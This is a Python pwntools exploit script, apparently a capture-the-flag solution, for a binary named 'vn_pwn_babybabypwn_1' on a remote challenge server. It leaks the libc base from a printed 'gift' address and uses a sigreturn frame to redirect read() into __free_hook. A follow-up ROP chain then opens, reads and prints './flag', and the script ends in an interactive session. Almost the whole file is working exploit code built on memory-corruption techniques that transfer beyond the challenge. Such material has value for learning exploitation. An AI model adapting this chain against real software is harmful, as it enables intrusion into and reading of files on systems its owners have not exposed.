# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
file = './vn_pwn_babybabypwn_1'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'node3.buuoj.cn'
port = '26001'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)
ru("gift: ")
libc.address = int(ru("\n"), 16) - libc.symbols['puts']
log.success(hex(libc.address))
poprdi = libc.address +0x0000000000021102
poprsi = libc.address +0x00000000000202e8
poprdx = libc.address +0x0000000000001b92
frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = (libc.symbols['__free_hook'])
frame.rdx = 0x100
frame.rip = (libc.symbols['read'])
frame.rsp = (libc.symbols['__free_hook'] + 8)
frame.rbp = (libc.symbols['__free_hook'] +0x1000)
frame.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0001 * 0x10000) | (0x0033 * 0x1)

rc()
dbg("b*"+hex(libc.symbols['read']))
se(str(frame)[8:])
sleep(2)
rop_chain = './flag\x00\x00'
rop_chain += p64(poprdi) + p64(libc.symbols['__free_hook']) + p64(poprsi) + p64(0) + p64(libc.symbols['open'])
rop_chain += p64(poprdi) + p64(3) + p64(poprsi) + p64(libc.symbols['__malloc_hook']) + p64(poprdx) + p64(0x50) + p64(libc.symbols['read'])
rop_chain += p64(poprdi) + p64(1) + p64(poprsi) + p64(libc.symbols['__malloc_hook']) + p64(poprdx) + p64(0x50) + p64(libc.symbols['write'])
sl(rop_chain)
print ru('\n')
shell()
